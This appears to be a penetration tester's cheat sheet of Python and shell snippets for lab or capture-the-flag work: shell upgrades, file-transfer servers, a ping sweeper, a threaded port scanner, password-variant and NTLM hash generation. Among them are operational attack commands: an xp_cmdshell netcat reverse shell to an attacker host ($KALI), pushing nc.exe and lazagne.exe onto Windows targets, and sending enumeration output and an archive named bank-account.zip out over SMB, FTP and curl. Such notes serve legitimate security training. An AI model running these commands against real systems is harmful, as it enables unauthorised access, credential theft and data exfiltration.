#### Convert 2to3
```bash - kali
python3 -m lib2to3 46635.py -w
```

#### Shell break
```python
python -c 'import pty;pty.spawn("/bin/bash")'
```
```python
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
```python
awk 'BEGIN {system("/bin/bash")}'
```
More suggestions here!

https://netsec.ws/?p=337

#### Crypto.Hash
```python
pip install --upgrade setuptools
```

```python
sudo apt-get install python2-dev
```

```python
pip2 install pycrypto && pip install distorm3
```

#### Server
```python
sudo python3 -m http.server 80
```
```python
pip3 install updog
```
```python
python3 -m updog -p 80 --password password123
```

Custom Post server:
```python
from http.server import BaseHTTPRequestHandler, HTTPServer
import os

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        print("Listening on port: 8080")
        length = int(self.headers['Content-Length'])
        data = self.rfile.read(length)
        filename = self.path.strip("/").replace("/", "_")
        with open(filename, "wb") as f:
            f.write(data)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

HTTPServer(("0.0.0.0", 8080), Handler).serve_forever()
```


#### Mail Server
```python
sudo python -m smtpd -n -c DebuggingServer $KALI:25
```
#### FTP Server
```bash - kali
python3 -m pyftpdlib -p 21 --write
```
```batch - windows
ftp $KALI
```
```batch - windows
anonymous
```
```batch - windows
anonymous
```
```batch - windows
binary
```
```batch - windows
put FILE.7z
```
```batch - windows
mput jaws-results.txt PowerUp.txt Seatbelt.txt Sherlock.txt winpeas.txt
```
#### SMB File Transfer
[[Impacket#Python venv quick launch]]

```
smbserver.py share . -smb2support -user Gonk -password Ware
```

```
net use \\$KALI\share /user:Gonk Ware
```

WINDOWS:
---
USE RCP TO COPY **TO** SMBSERVER:
```
rcp -b bank-account.zip \\$KALI\share
```
USE RCP TO COPY **FROM** SMBSERVER:
```
rcp \\$KALI\share\lazagne.exe .
```
OR
CONNECT TO SHARE WITH NO AUTH:
```batch - windows
net use \\$KALI\share
```
COPY FROM WINDOWS TO KALI:
```batch - windows
copy winpeas.txt \\$KALI\share\
```
COPY FROM KALI TO WINDOWS:
```
copy \\$KALI\share\nc.exe %TEMP%\nc.exe
```
REVERSE SHELL:
```
xp_cmdshell %TEMP%\nc.exe -e cmd.exe $KALI 80
```
---
LINUX:
```bash - target
smbclient \\\\$KALI\\share -U "df" -p df
```
```bash - target
mput *.txt
```
```batch - windows
del 20191018035324_BloodHound.zip
```
```batch - windows
net use /d \\$KALI\share
```
#### Install on windows CMD
https://docs.python.org/3/using/windows.html
#### ping scanner
```
#!/usr/bin/python3
import sys, os
for i in range(int(sys.argv[2]), int(sys.argv[3])+1):
	ip = f"{sys.argv[1]}.{i}"
	response = os.system(f"ping -c 1 {ip} > /dev/null 2>&1")
	if response ==0:
		print(ip)
```
#### Port scanner
```python
import argparse, socket, errno, threading, queue
#Initialize the parser
parser = argparse.ArgumentParser(description='A port scanner capable of basic TCP connect scans.')
parser.add_argument('Target', help='an ip or hostname to scan.')
parser.add_argument('-p', help='a port range specified using the \'-\' character or a comma separated list of ports to scan (Default 1-1024).')
parser.add_argument('-t', type=int, help='number of threads to use (Default 10).')
args = parser.parse_args()
#Retrieve parameter values from the parser arguments
target = args.Target
ports = range(1,1024)
if args.p != None and "-" in args.p:
    [minPort,maxPort] = [int(i) for i in args.p.split("-")]
    ports = range(minPort,maxPort+1)
elif args.p != None:
    ports = [int(i) for i in args.p.split(",")]
threads = 10
if args.t != None:
    threads = args.t
# Define global variables
results = {}
lock = threading.Lock()
q = queue.Queue()
#connect(ip, port) - Connects to an ip address on a specified port to check if it is open
#Params:
#   ip - The ip to connect to
#   port - The port to connect to on the specified ip
#
#Returns: 'Open', 'Closed' or 'Filtered' depending on the result of connecting to the specified ip and port
def connect(ip, port):
    status = ""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        connection = s.connect((ip, port))
        status = "Open"
        s.close()
    except socket.timeout:
        status = "Filtered"
    except socket.error as e:
        if e.errno == errno.ECONNREFUSED:
            status = "Closed"
        else:
            raise e
    return status
#worker() - A function for worker threads to scan IPs and ports
def worker():
    while not q.empty():
        (ip,port) = q.get()
        status = connect(ip,port)
        lock.acquire()
        results[port] = status
        lock.release()
        q.task_done()
#Prepare queue
for port in ports:
    q.put((target,port))
#Start threads
for i in range(threads):
    t = threading.Thread(target=worker)
    t.start()
print("Started a scan of " + target + "\n" + "-"*10)
q.join()
#Present the scan results
for port in ports:
    print("Port " + str(port) + " is " + results[port])
```
#### python3 servers with PUT support:
```bash
wget https://gist.github.com/touilleMan/eb02ea40b93e52604938
```
```bash
wget https://gist.github.com/mildred/67d22d7289ae8f16cae7
```
```bash
wget https://gist.githubusercontent.com/touilleMan/eb02ea40b93e52604938/raw/b5b9858a7210694c8a66ca78cfed0b9f6f8b0ce3/SimpleHTTPServerWithUpload.py
```
##### upload with curl command:
```bash
curl -F 'file=@/tmp/linpeas.txt' [http://$KALI](http://%3cKALI%3e)
```
##### Install pip
```bash - kali
curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py; python get-pip.py
```
```bash - kali
curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py; python get-pip.py
```
#### Decode Hex
```python - kali
import binascii
s='50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135'
print(binascii.unhexlify(s.replace(' ','')))
```
P@ssw0rd@123!!123
#### Password manipulation
Run with python3!
```python
base_string = 'ThisIsTheUsersPassword'
for i in range(1, 26):
    print(f'{base_string}{i:02}')
```
```
 python3 pass.py
```
#### NTLM Generator
```
import hashlib,binascii
hash = hashlib.new('md4', "ThisIsTheUsersPassword22".encode('utf-16le')).digest()
print binascii.hexlify(hash)
```
#### Errors
>TypeError: a bytes-like object is required, not 'str'
Try adding `.encode()` like so:
```
s.send('USER '.encode() + buffer.encode() + '\r\n'.encode())
```
#### pickle file
Replace the file name to open, and filename to write to:
```python - kali
import pickle
# open a file, where you stored the pickled data
file = open('y.pkl', 'rb')
# dump information to that file
data = pickle.load(file)
# close the file
file.close()
#print('Showing the pickled data:')
cnt = 0
for item in data:
    with open("y.txt", 'a') as out:
        out.write(str(item))
        #print('The data ', cnt, ' is : ', item)
        cnt += 1
```
#### Install old versions of python
Method 1
```bash - kali
sudo apt install build-essential
```
```bash - kali
sudo add-apt-repository ppa:deadsnakes/ppa
```
```bash - kali
sudo apt update
```
```bash - kali
sudo apt install python3.10 python3.10-dev
```
Method 2
```
echo 'deb http://ftp.de.debian.org/debian bookworm main' >> /etc/apt/sources.list
```
```
sudo apt update
```
```
sudo apt install python3-dev python3.10-dev libpython3.10 libpython3.10-dev python3.10
```
#### error: externally-managed-environment
```
sudo pip3 install pycryptodome --break-system-packages
```